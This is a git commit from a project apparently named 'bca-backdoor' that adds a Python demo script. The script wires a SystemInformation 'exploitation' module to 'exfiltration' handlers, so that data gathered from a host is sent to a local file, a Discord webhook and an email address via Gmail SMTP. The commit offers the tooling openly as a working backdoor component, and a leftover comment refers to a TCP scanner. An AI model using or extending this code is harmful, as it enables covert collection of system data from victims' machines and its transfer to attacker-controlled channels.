a07a37f82e9f1787fbbc90e1b8b455417e82d7f0
EONRaider <livewire_voodoo@protonmail.com>
2021-10-13 16:04:09 -0300

    Implement SystemInformation module
    The SystemInformation class was added to
    system_information.py
    
    - Implemented a demo file on sysinfo_demo.py
    - Modified imports in __init__.py at
    exploitation directory

---
+++ demo_files/sysinfo_demo.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+# https://github.com/EONRaider/bca-backdoor
+
+__author__ = "EONRaider @ keybase.io/eonraider"
+
+import os
+import pathlib
+
+from src.modules.exfiltration import Discord, Email, File, Screen
+from src.modules.exploitation import SystemInformation
+
+import dotenv
+
+
+'''This is a simple demonstration of how the SystemInformation module 
+could be set up on a Linux system to perform a basic collection of 
+system data and exfiltrate the results to a text file, a Discord server 
+and an email address (as well as to the screen for debugging purposes).
+The environment variable 'WEBHOOK_URL' must be passed if the Discord 
+exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
+'EMAIL_PASSWORD' for the Email exfiltrator.
+'''
+
+dotenv.load_dotenv()
+
+# Set up the TCPScanner to send probes to internal and external targets
+sysinfo = SystemInformation()
+
+# Enable output of logs to STDOUT
+Screen(module=sysinfo)
+
+# A file will be written to the current user's Desktop
+File(module=sysinfo,
+     file_path=pathlib.Path.home().joinpath("Desktop/sample_sysinfo_log.txt"))
+
+# Scan results will be sent to a Discord server through a Webhook URL
+Discord(module=sysinfo,
+        webhook_url=os.getenv("WEBHOOK_URL"))
+
+# An email will be sent through a secure connection using SMTP
+Email(module=sysinfo,
+      smtp_host="smtp.gmail.com",
+      smtp_port=465,
+      email=os.getenv("EMAIL_USERNAME"),
+      password=os.getenv("EMAIL_PASSWORD"))
+
+# Done. Perform all scans and proceed to exfiltration of data.
+sysinfo.execute()
